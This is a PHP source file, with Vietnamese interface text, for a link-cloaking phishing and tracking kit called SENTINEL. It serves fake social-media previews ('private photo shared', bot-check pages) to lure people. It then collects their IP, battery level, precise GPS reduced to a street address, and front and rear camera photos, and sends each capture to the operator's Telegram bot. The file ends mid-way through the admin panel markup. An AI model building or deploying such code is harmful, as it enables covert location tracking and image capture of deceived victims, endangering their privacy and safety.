<?php
/**
 * SENTINEL v180.0 - PHANTOM CLOAKING SUPREME (2026)
 * [✓] Phantom Cloaking: Fake Meta (Title/Desc/Img) dành riêng cho TRÌNH TẠO ẢNH ẨN.
 * [✓] Consent Capture: Camera/GPS chỉ chạy sau thao tác đồng ý của người xem.
 * [✓] Full Admin Panel: 6 Tab (Dự án, Nhật ký, Ảnh ẩn, Web, Bot, Admin Loc).
 * [✓] Military Precision: Ép lấy tọa độ vệ tinh thực, dịch địa chỉ số nhà chi tiết.
 */

session_start();
error_reporting(0);
date_default_timezone_set('Asia/Ho_Chi_Minh');

// ================= 1. DATABASE & CONFIG =================
$admin_pass = '123'; 
$db_file    = '.ht_sentinel_v180_final.db';
$retention_days = 30;
$base_url   = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . explode('index.php', $_SERVER['PHP_SELF'])[0];

try {
    $db = new PDO("sqlite:$db_file");
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("CREATE TABLE IF NOT EXISTS links (id TEXT PRIMARY KEY, title TEXT, desc TEXT, img TEXT, redir TEXT, clicks INTEGER DEFAULT 0)");
    $db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, lid TEXT, v4 TEXT, v6 TEXT, addr TEXT, la REAL, lo REAL, img TEXT, cam_front TEXT, cam_back TEXT, st TEXT, bat TEXT, time DATETIME DEFAULT CURRENT_TIMESTAMP)");
    foreach (['cam_front' => 'TEXT', 'cam_back' => 'TEXT'] as $col => $type) {
        try { $db->exec("ALTER TABLE logs ADD COLUMN $col $type"); } catch (Exception $e) {}
    }
    $db->exec("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)");
    
    if ($db->query("SELECT COUNT(*) FROM settings")->fetchColumn() == 0) {
        $defaults = [
            'tg_token' => '', 'tg_id' => '', 
            'tg_msg_template' => "🛰️ <b>MỤC TIÊU: [ID]</b>\n🛡️ <b>[ST]</b>\n📍 <code>[ADDR]</code>\n🌐 IP: <code>[IP]</code>\n🔋 PIN: <b>[BAT]</b>\n📷 Camera: <b>[CAM_STATUS]</b>\n🗺️ <a href='https://www.google.com/maps?q=[LA],[LO]'>XEM GOOGLE MAPS</a>",
            'ui_msg' => 'ĐANG LOADING...', 'ui_st' => 'KIỂM TRA ROBOT TRÌNH DUYỆT', 'btn_text' => 'XÁC MINH NGAY',
            'root_title' => 'Security Sync', 'root_desc' => 'Identity Verification Required', 
            'root_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
            'root_redir' => 'https://google.com',
            'proxy_img_url' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
            'px_fake_ttl' => 'Ảnh riêng tư được chia sẻ', 
            'px_fake_dsc' => 'Bấm vào để xem nội dung hình ảnh định dạng HD.',
            'px_fake_img' => 'https://www.gstatic.com/images/branding/product/2x/photos_96dp.png',
            'capture_front' => '1',
            'capture_back' => '1',
            'capture_audio' => '0'
        ];
        foreach($defaults as $k => $v) { $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $v]); }
    }
    $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute(['capture_audio', '0']);
} catch (Exception $e) { die("Bảo trì."); }

function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
function enforce_admin_rate_limit($bucket, $limit = 20, $window = 60) {
    $now = time();
    $_SESSION['rate_limits'][$bucket] = array_values(array_filter($_SESSION['rate_limits'][$bucket] ?? [], fn($ts) => $ts > $now - $window));
    if (count($_SESSION['rate_limits'][$bucket]) >= $limit) {
        http_response_code(429);
        echo json_encode(['ok' => false, 'error' => "Chống spam: tối đa $limit lần / $window giây. Vui lòng thử lại sau."]);
        exit;
    }
    $_SESSION['rate_limits'][$bucket][] = $now;
}
function input_value($key, $json = null) {
    if (isset($_POST[$key])) return trim($_POST[$key]);
    if (isset($_GET[$key])) return trim($_GET[$key]);
    if (is_array($json) && isset($json[$key])) return trim($json[$key]);
    return '';
}

function same_host_url($a, $b) {
    $ha = strtolower(parse_url($a, PHP_URL_HOST) ?: '');
    $hb = strtolower(parse_url($b, PHP_URL_HOST) ?: '');
    return $ha !== '' && $ha === $hb;
}
function absolute_url($url, $base) {
    $url = trim($url);
    if ($url === '') return '';
    if (preg_match('#^https?://#i', $url)) return $url;
    $scheme = parse_url($base, PHP_URL_SCHEME) ?: 'https';
    $host = parse_url($base, PHP_URL_HOST) ?: '';
    if ($host === '') return $url;
    if (strpos($url, '//') === 0) return $scheme . ':' . $url;
    if ($url[0] === '/') return $scheme . '://' . $host . $url;
    $path = parse_url($base, PHP_URL_PATH) ?: '/';
    $dir = rtrim(str_replace('\\', '/', dirname($path)), '/');
    return $scheme . '://' . $host . ($dir ? $dir . '/' : '/') . $url;
}
function fetch_owned_page_meta($display_url, $redir) {
    if (!$display_url || !filter_var($display_url, FILTER_VALIDATE_URL) || !in_array(parse_url($display_url, PHP_URL_SCHEME), ['http', 'https'], true)) {
        return [null, null, null, 'Web hiển thị không hợp lệ.'];
    }
    if (!same_host_url($display_url, $redir)) {
        return [null, null, null, 'Web hiển thị phải cùng tên miền với link đích để tránh giả mạo nội dung website khác.'];
    }
    $ctx = stream_context_create(['http' => ['method' => 'GET', 'timeout' => 6, 'header' => "User-Agent: SentinelLocalPreview/1.0\r\nAccept: text/html,*/*;q=0.8\r\n"]]);
    $html = @file_get_contents($display_url, false, $ctx, 0, 262144);
    if (!$html) return [null, null, null, 'Không đọc được web hiển thị, dùng thông tin mặc định.'];
    $pick = function($patterns) use ($html) {
        foreach ($patterns as $re) if (preg_match($re, $html, $m)) return html_entity_decode(trim($m[1]), ENT_QUOTES | ENT_HTML5, 'UTF-8');
        return null;
    };
    $title = $pick(['/<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)/i', '/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\']/i', '/<title[^>]*>(.*?)<\/title>/is']);
    $desc = $pick(['/<meta[^>]+property=["\']og:description["\'][^>]+content=["\']([^"\']+)/i', '/<meta[^>]+name=["\']description["\'][^>]+content=["\']([^"\']+)/i']);
    $img = $pick(['/<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)/i']);
    if ($img) $img = absolute_url($img, $display_url);
    return [$title, $desc, $img, null];
}
$ip_v4_serv = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// ================= 2. XỬ LÝ NỘI BỘ (SOI IP / REV-GEO / PUSH / LOCAL LINK / WEBHOOK) =================
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    if ($_GET['action'] === 'quick_check') {
        echo @file_get_contents("http://ip-api.com/json/{$_GET['ip']}?fields=status,message,query,country,city,isp,lat,lon,proxy");
    }
    if ($_GET['action'] === 'rev_geo') {
        $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
        echo @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat={$_GET['la']}&lon={$_GET['lo']}&accept-language=vi", false, stream_context_create($opts));
    }
    if ($_GET['action'] === 'shorten_link') {
        if (($_SESSION['v180_auth'] ?? '') !== $admin_pass) { http_response_code(403); echo json_encode(['ok' => false, 'error' => 'Chưa đăng nhập admin.']); exit; }
        enforce_admin_rate_limit('shorten_link');
        $raw = file_get_contents('php://input');
        $in = json_decode($raw, true) ?: [];
        if (!$in && stripos($_SERVER['CONTENT_TYPE'] ?? '', 'application/x-www-form-urlencoded') !== false) parse_str($raw, $in);
        $url = input_value('url', $in);
        if (!filter_var($url, FILTER_VALIDATE_URL) || !in_array(parse_url($url, PHP_URL_SCHEME), ['http', 'https'], true)) {
            http_response_code(422); echo json_encode(['ok' => false, 'error' => 'URL không hợp lệ.']); exit;
        }
        $seed = preg_replace('/[^a-z0-9]+/i', '-', parse_url($url, PHP_URL_HOST) ?: 'link');
        $seed = trim(strtolower($seed), '-') ?: 'link';
        do { $lid = 'go-' . substr($seed, 0, 20) . '-' . strtolower(bin2hex(random_bytes(3))); $chk = $db->prepare('SELECT COUNT(*) FROM links WHERE id = ?'); $chk->execute([$lid]); } while ($chk->fetchColumn() > 0);
        $db->prepare("INSERT INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$lid, 'Link rút gọn nội bộ', 'Liên kết chuyển hướng nội bộ.', get_c('root_img'), $url]);
        $short = $base_url . '?v=' . rawurlencode($lid);
        echo json_encode(['ok' => true, 'short' => $short, 'url' => $short, 'id' => $lid, 'local_only' => true]);
    }
    if ($_GET['action'] === 'auto_fake_link') {
        if (($_SESSION['v180_auth'] ?? '') !== $admin_pass) { http_response_code(403); echo json_encode(['ok' => false, 'error' => 'Chưa đăng nhập admin.']); exit; }
        enforce_admin_rate_limit('auto_fake_link', 10, 60);
        $raw = file_get_contents('php://input');
        $in = json_decode($raw, true) ?: [];
        if (!$in && stripos($_SERVER['CONTENT_TYPE'] ?? '', 'application/x-www-form-urlencoded') !== false) parse_str($raw, $in);
        $redir = input_value('redir', $in);
        if (!filter_var($redir, FILTER_VALIDATE_URL) || !in_array(parse_url($redir, PHP_URL_SCHEME), ['http', 'https'], true)) {
            http_response_code(422); echo json_encode(['ok' => false, 'error' => 'Link ẩn/link đích không hợp lệ.']); exit;
        }
        $seed = preg_replace('/[^a-z0-9]+/i', '-', parse_url($redir, PHP_URL_HOST) ?: 'link');
        $seed = trim(strtolower($seed), '-') ?: 'link';
        do { $lid = substr($seed, 0, 24) . '-' . strtolower(bin2hex(random_bytes(3))); $chk = $db->prepare('SELECT COUNT(*) FROM links WHERE id = ?'); $chk->execute([$lid]); } while ($chk->fetchColumn() > 0);
        $display_url = input_value('display_url', $in) ?: $redir;
        [$meta_title, $meta_desc, $meta_img, $meta_warning] = fetch_owned_page_meta($display_url, $redir);
        if ($meta_warning && !same_host_url($display_url, $redir)) {
            http_response_code(422); echo json_encode(['ok' => false, 'error' => $meta_warning]); exit;
        }
        $title = trim($in['title'] ?? '') ?: ($meta_title ?: 'Liên kết chuyển hướng nội bộ');
        $desc = trim($in['desc'] ?? '') ?: ($meta_desc ?: 'Bấm để mở nội dung được chia sẻ.');
        $img = trim($in['img'] ?? '') ?: ($meta_img ?: get_c('root_img'));
        $db->prepare("INSERT INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$lid, $title, $desc, $img, $redir]);
        $campaign = $base_url . '?v=' . rawurlencode($lid);
        echo json_encode(['ok' => true, 'id' => $lid, 'url' => $campaign, 'short' => $campaign, 'local_only' => true, 'meta' => ['title' => $title, 'desc' => $desc, 'img' => $img, 'source' => $display_url], 'warning' => $meta_warning]);
    }
    if ($_GET['action'] === 'push') {
        $in = json_decode(file_get_contents('php://input'), true);
        $img_link = "";
        if (!empty($in['img'])) {
            $img_name = 'snap_' . time() . '_' . rand(100,999) . '.jpg';
            file_put_contents($img_name, base64_decode(str_replace('data:image/jpeg;base64,', '', $in['img'])));
            $img_link = $base_url . $img_name;
        }
        $cam_front_link = '';
        $cam_back_link = '';
        foreach (['img_front' => 'front', 'img_back' => 'back'] as $field => $suffix) {
            if (!empty($in[$field])) {
                $img_name = 'snap_' . $suffix . '_' . time() . '_' . rand(100,999) . '.jpg';
                file_put_contents($img_name, base64_decode(str_replace('data:image/jpeg;base64,', '', $in[$field])));
                if ($field === 'img_front') $cam_front_link = $base_url . $img_name;
                if ($field === 'img_back') $cam_back_link = $base_url . $img_name;
            }
        }
        if (!$img_link) $img_link = $cam_front_link ?: $cam_back_link;
        $lat = $in['la'] ?? $in['lat'] ?? null; $lon = $in['lo'] ?? $in['lon'] ?? null; $addr = "Chưa xác định";
        if ($lat !== null && $lat !== '' && $lon !== null && $lon !== '') {
            $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
            $rev = json_decode(@file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lon&accept-language=vi", false, stream_context_create($opts)), true);
            $addr = $rev['display_name'] ?? "Tọa độ GPS: $lat, $lon";
        } else {
            $ip_res = json_decode(@file_get_contents("http://ip-api.com/json/{$in['v4']}?fields=status,city,country,lat,lon"), true);
            if($ip_res['status'] == 'success') { $addr = $ip_res['city'] . ", " . $ip_res['country'] . " (IP-Geo gần nhất)"; $lat = $ip_res['lat']; $lon = $ip_res['lon']; if (strpos($in['st'] ?? '', 'IP-Geo') === false) $in['st'] = trim(($in['st'] ?? '') . ' / IP-Geo Fallback'); }
        }
        $db->prepare("INSERT INTO logs (lid, v4, v6, addr, la, lo, img, cam_front, cam_back, st, bat) VALUES (?,?,?,?,?,?,?,?,?,?,?)")->execute([$in['lid'], $in['v4'], $in['v6'], $addr, $lat, $lon, $img_link, $cam_front_link, $cam_back_link, $in['st'], $in['bat']]);
        $tk = get_c('tg_token'); $admin_id = get_c('tg_id');
        if ($tk && $admin_id) {
            $tpl = get_c('tg_msg_template');
            $cam_status = ($cam_front_link ? '✅ Camera trước' : '❌ Camera trước') . ' / ' . ($cam_back_link ? '✅ Camera sau' : '❌ Camera sau');
            $msg = str_replace(['[ID]','[ST]','[ADDR]','[IP]','[BAT]','[LA]','[LO]','[CAM_STATUS]'], [$in['lid'], $in['st'], $addr, $in['v4'], $in['bat'], $lat, $lon, $cam_status], $tpl);
            $photos = array_values(array_filter([$cam_front_link, $cam_back_link]));
            if (count($photos) > 1) {
                @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($photos[0])."&caption=".urlencode($msg)."&parse_mode=HTML");
                @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($photos[1])."&caption=".urlencode('Camera sau')."&parse_mode=HTML");
            } elseif ($img_link) @file_get_contents("https://api.telegram.org/bot$tk/sendPhoto?chat_id=$admin_id&photo=".urlencode($img_link)."&caption=".urlencode($msg)."&parse_mode=HTML");
            else @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=HTML");
        }
    }
    exit;
}

// ================= 3. TRÌNH TẠO ẢNH ẨN (PHANTOM ENGINE + CLOAKING) =================
if (isset($_GET['img']) && $_GET['img'] === 'pixel') {
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title><?=htmlspecialchars(get_c('px_fake_ttl'))?></title>
<meta property="og:title" content="<?=htmlspecialchars(get_c('px_fake_ttl'))?>">
<meta property="og:description" content="<?=htmlspecialchars(get_c('px_fake_dsc'))?>">
<meta property="og:image" content="<?=htmlspecialchars(get_c('px_fake_img'))?>">
<script src="https://cdn.tailwindcss.com"></script><style>body{min-height:100vh;min-height:-webkit-fill-available;padding:calc(1rem + env(safe-area-inset-top)) max(1rem,env(safe-area-inset-right)) calc(1rem + env(safe-area-inset-bottom)) max(1rem,env(safe-area-inset-left));-webkit-font-smoothing:antialiased}button{font-size:16px;-webkit-tap-highlight-color:transparent;touch-action:manipulation}</style></head>
<body class="bg-black flex flex-col gap-4 items-center justify-center"><img src="<?=get_c('proxy_img_url')?>" class="max-w-full shadow-2xl rounded-xl">
<div class="bg-slate-900/90 border border-slate-700 rounded-2xl p-4 text-center max-w-sm text-white">
    <p class="text-sm mb-3">Cho phép trình duyệt lấy vị trí và chụp camera trước/sau để gửi báo cáo Telegram.</p>
    <button id="send_report" class="bg-blue-600 px-5 py-3 rounded-xl font-bold">Gửi báo cáo có đồng ý</button>
    <p id="report_status" class="text-xs text-slate-400 mt-3"></p>
</div>
<script>
    const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
    const captureBack = <?=json_encode(get_c('capture_back') === '1')?>;
    const captureAudio = <?=json_encode(get_c('capture_audio') === '1')?>;
    async function askMicConsent(){ if(!captureAudio || !navigator.mediaDevices) return false; try { const s=await navigator.mediaDevices.getUserMedia({audio:true, video:false}); s.getTracks().forEach(t=>t.stop()); return true; } catch(e){ return false; } }
    async function takeSnap(facingMode){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}}}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); await v.play(); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
    const push = (payload) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: 'IMAGE', v4:v4, v6:'N/A', bat:bat, ...payload })});
    let v4="<?=$ip_v4_serv?>", bat="N/A";
    async function initInfo(){ try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){} }
    async function getApproxLocationByIp(prefix){ try { const d=await (await fetch('?action=quick_check&ip='+encodeURIComponent(v4))).json(); if(d.status==='success' && d.lat !== undefined && d.lon !== undefined) return {la:d.lat, lo:d.lon, st:prefix+' / IP-Geo Fallback'}; } catch(e){} return {la:null, lo:null, st:prefix+' / IP-Geo Unavailable'}; }
    async function askGeoOrFallback(prefix){ return new Promise(resolve => { if(!navigator.geolocation) return resolve(getApproxLocationByIp(prefix+' GPS Unavailable')); navigator.geolocation.getCurrentPosition(p => resolve({la:p.coords.latitude, lo:p.coords.longitude, st:prefix+' GPS OK - User Consent'}), async () => resolve(await getApproxLocationByIp(prefix+' GPS Denied')), { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }); }); }
    async function consentReport(){
        const status=document.getElementById('report_status'); status.innerText='Đang lấy quyền hoặc vị trí gần nhất theo IP...';
        const loc = await askGeoOrFallback('IMAGE');
        const img_front = captureFront ? await takeSnap('user') : null;
        const img_back = captureBack ? await takeSnap('environment') : null;
        const mic_ok = await askMicConsent();
        loc.st += mic_ok ? ' / Mic Consent OK' : (captureAudio ? ' / Mic Consent Denied' : '');
        await push({...loc, img_front, img_back, img: img_front || img_back});
        status.innerText=loc.st.includes('IP-Geo') ? 'Đã gửi báo cáo bằng vị trí gần nhất theo IP.' : 'Đã gửi báo cáo theo quyền bạn cho phép.';
    }
    window.onload = async () => { await initInfo(); document.getElementById('send_report').onclick = consentReport; };
</script></body></html>
<?php exit; }

// ================= 4. ADMIN DASHBOARD =================
if (isset($_GET['admin'])) {
    if (($_POST['p'] ?? $_SESSION['v180_auth'] ?? '') !== $admin_pass) {
?>
<!DOCTYPE html><html><head><title>SENTINEL MASTER</title><script src="https://cdn.tailwindcss.com"></script>
<style>
    body { background: #05070a; font-family: 'Inter', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
    .glass { background: rgba(13, 17, 23, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(59, 130, 246, 0.2); padding: 3.5rem; border-radius: 3rem; text-align: center; width: 100%; max-width: 400px; box-shadow: 0 0 100px rgba(0,0,0,1); }
    input { background: #000; border: 1px solid #1e293b; padding: 1.25rem; border-radius: 1.5rem; color: #3b82f6; width: 100%; text-align: center; font-weight: 900; outline: none; margin-bottom: 1.5rem; }
    button { background: #3b82f6; color: white; padding: 1rem; border-radius: 1.5rem; width: 100%; font-weight: 900; text-transform: uppercase; cursor: pointer; }
</style></head>
<body><form method="POST" class="glass"><h2 class="text-blue-500 font-black italic mb-10 tracking-widest uppercase">SENTINEL MASTER</h2><input type="password" name="p" placeholder="ACCESS KEY" autofocus><button type="submit">Login</button></form></body></html>
<?php exit; }
    $_SESSION['v180_auth'] = $admin_pass;
    
    if (isset($_GET['clear_logs'])) { $db->exec("DELETE FROM logs"); header("Location: ?admin&t=2"); exit; }
    if (isset($_GET['del_l'])) { $db->prepare("DELETE FROM links WHERE id = ?")->execute([$_GET['del_l']]); header("Location: ?admin"); exit; }
    if (isset($_POST['save_cfg'])) {
        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img', 'capture_front', 'capture_back', 'capture_audio'];
        foreach (['capture_front', 'capture_back', 'capture_audio'] as $ck) { if (!isset($_POST[$ck])) $_POST[$ck] = '0'; }
        foreach($keys as $k) { if(isset($_POST[$k])) $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$k, $_POST[$k]]); }
        header("Location: ?admin&t=".($_GET['t'] ?? '1')); exit;
    }
    if (isset($_POST['save_link'])) {
        foreach (['capture_front', 'capture_back', 'capture_audio'] as $ck) {
            $db->prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)")->execute([$ck, isset($_POST[$ck]) ? '1' : '0']);
        }
        $db->prepare("INSERT OR REPLACE INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$_POST['lid'], $_POST['ttl'], $_POST['dsc'], $_POST['img'], $_POST['red']]); header("Location: ?admin"); exit;
    }

    $links = $db->query("SELECT * FROM links ORDER BY clicks DESC")->fetchAll();
    $logs = $db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll();
?>
<!DOCTYPE html><html><head><title>SENTINEL MASTER</title><script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" /><script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@900&display=swap');
    :root { --deep: #05070a; --card: #0d1117; --neon: #3b82f6; --dim: #94a3b8; }
    body { background: var(--deep); color: var(--dim); font-family: 'Inter'; }
    .tab-content { display: none !important; } .tab-content.active { display: block !important; animation: fadeIn 0.3s ease; }
    .tab-content#t1.active { display: grid !important; }
    .link-pane { display: none; } .link-pane.active { display: block; animation: fadeIn 0.2s ease; }
    .link-subtab.active { background: #0891b2; color: #fff; border-color: #22d3ee; }
    .link-guide { display: block; } .link-guide.hidden-guide { display: none; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    .card { background: var(--card); border: 1px solid #1e293b; border-radius: 2rem; padding: 2rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
    input, textarea { background: black; border: 1px solid #1e293b; padding: 1rem; border-radius: 0.75rem; color: white; width: 100%; outline: none; }
    .sidebar-btn { padding: 1rem; border-radius: 0.75rem; text-align: left; font-weight: 900; text-transform: uppercase; font-style: italic; font-size: 10px; width:100%; border:none; background:transparent; color: var(--dim); cursor:pointer; }
    .sidebar-btn.active { color: white; border-bottom: 2px solid var(--neon); background: var(--card); }
    .btn-pro { background: var(--neon); color: white; padding: 1rem; border-radius: 2rem; font-weight: 900; text-transform: uppercase; border:none; cursor:pointer; width: 100%; }
    .ios-safe { padding-left: max(1.5rem, env(safe-area-inset-left)); padding-right: max(1.5rem, env(safe-area-inset-right)); padding-bottom: max(1.5rem, env(safe-area-inset-bottom)); }
    .toggle-card { -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
    .toggle-card input { width: 1.15rem; height: 1.15rem; accent-color: var(--neon); flex: none; }
    @supports (-webkit-touch-callout: none) {
        body { min-height: -webkit-fill-available; -webkit-font-smoothing: antialiased; }
        input, textarea, button { font-size: 16px; -webkit-appearance: none; appearance: none; }
        input[type="checkbox"] { -webkit-appearance: checkbox; appearance: checkbox; }
        .card { border-radius: 1.5rem; }
        aside { width: 5.5rem; padding: 1rem 0.75rem; }
        aside h1 { font-size: 9px; line-height: 1.15; }
        .sidebar-btn { padding: 0.85rem 0.65rem; font-size: 9px; text-align: center; }
        main { padding: 1rem; }
    }
    @media (max-width: 768px) {
        body { flex-direction: column; height: auto; min-height: 100vh; overflow: auto; }
        aside { width: 100%; flex-direction: row; overflow-x: auto; border-right: 0; border-bottom: 1px solid #1e293b; padding: 1rem; gap: 0.5rem; position: sticky; top: 0; z-index: 20; background: rgba(5,7,10,0.95); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); }
        aside h1, aside .mt-auto { display: none; }
        .sidebar-btn { min-width: 4.75rem; text-align: center; }
        main { width: 100%; padding: 1rem; }
        .card { padding: 1rem; border-radius: 1.5rem; }
        table { min-width: 680px; }
        .overflow-hidden:has(table) { overflow-x: auto; }
    }
</style></head>
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
    <aside class="w-64 border-r border-slate-800 p-6 flex flex-col gap-4">
        <h1 class="text-white text">SENTINEL MASTER</h1>
        <button onclick="st(1,this)" id="nb1" class="sidebar-btn active">🔗 DỰ ÁN CHIẾN DỊCH</button>
        <button onclick="st(2,this)" id="nb2" class="sidebar-btn">📊 NHẬT KÝ LIVE</button>
        <button onclick="st(3,this)" id="nb3" class="sidebar-btn text-purple-500">🖼️ TRÌNH TẠO ẢNH ẨN</button>
        <button onclick="st(4,this)" id="nb4" class="sidebar-btn text-emerald-500">🌐 CẤU HÌNH WEB</button>
        <button onclick="st(5,this)" id="nb5" class="sidebar-btn text-blue-500">🤖 TELEGRAM BOT</button>
        <button onclick="st(6,this)" id="nb6" class="sidebar-btn text-yellow-500">📍 VỊ TRÍ CỦA TÔI</button>
        <button onclick="st(7,this)" id="nb7" class="sidebar-btn text-cyan-500">🧭 QUẢN LÝ LINK</button>
        <div class="mt-auto"><a href="?admin&logout=1" class="text-red-500 opacity-50 hover:opacity-100 transition-all uppercase">Logout</a></div>
    </aside>

    <main class="flex-1 p-10 overflow-auto ios-safe">
        <div id="t1" class="tab-content active grid lg:grid-cols-3 gap-8">
            <div class="space-y-6">
                <form method="POST" id="lF" class="card space-y-4 shadow-2xl">
                    <h3 class="text-blue-500 text-[9px] uppercase italic">Fake Link Setup</h3>
                    <input name="lid" id="fId" placeholder="ID Link" required>
                    <input name="ttl" id="fTtl" placeholder="TIÊU ĐỀ MỒI" oninput="upV()">
                    <textarea name="dsc" id="fDsc" placeholder="MÔ TẢ MỒI..." oninput="upV()"></textarea>
                    <input name="img" id="fImg" placeholder="LINK ẢNH MỒI" oninput="upV()">                    
                    <input name="red" id="fRed" placeholder="LINK ĐÍCH" required>
                    <div class="grid grid-cols-2 gap-3 text-white normal-case text-[9px]">
                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_front" value="1" <?=get_c('capture_front') === '1' ? 'checked' : ''?>> Camera trước</label>
                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2"><input type="checkbox" name="capture_back" value="1" <?=get_c('capture_back') === '1' ? 'checked' : ''?>> Camera sau</label>
                        <label class="toggle-card bg-black border border-slate-800 rounded-xl p-3 flex items-center gap-2 col-span-2"><input type="checkbox" name="capture_audio" value="1" <?=get_c('capture_audio') === '1' ? 'checked' : ''?>> Yêu cầu quyền micro (không ghi/lưu âm thanh)</label>
                    </div>
                    <p class="text-[7px] text-amber-400 normal-case italic">Tùy chọn này lưu cấu hình camera chung cho chiến dịch/web; trình duyệt vẫn yêu cầu người xem cấp quyền.</p>
                    <button type="submit" name="save_link" class="btn-pro">LƯU DỰ ÁN</button>
                </form>
                <div class="card p-6 shadow-2xl"><div id="vSim" class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl"><div id="vImg" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div><div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề mồi...</p><p id="vDsc" class="text-slate-400 text-[8px] line-clamp-2 italic normal-case">Mô tả hiển thị...</p></div></div></div>
            </div>
            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit"><table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Link & Meta</th><th class="p-6 text-center">Hits</th><th class="p-6 text-right">Action</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u=$base_url."?v=".$l['id']; $sid='short_'.preg_replace('/[^a-zA-Z0-9_-]/','_', $l['id']); ?><tr><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px]" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code><br><button type="button" onclick="makeShort('<?=$sid?>',decodeURIComponent('<?=rawurlencode($u)?>'))" class="text-cyan-400 text-[8px] uppercase mt-2">TẠO LINK NỘI BỘ</button><code id="<?=$sid?>" class="block text-cyan-300 text-[8px] normal-case cursor-pointer" onclick="if(this.innerText)navigator.clipboard.writeText(this.innerText)"></code></td><td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td><td class="p-6 text-right space-x-3"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table></div>
        </div>

        <div id="t2" class="tab-content space-y-8">
            <div class="flex justify-between items-center"><h2 class="text-white text-xl uppercase italic">🛰️ NHẬT KÝ LIVE</h2><button onclick="location.href='?admin&clear_logs=1'" class="bg-red-900/40 text-red-500 px-6 py-2 rounded-xl italic font-black uppercase">🗑️ DỌN SẠCH</button></div>
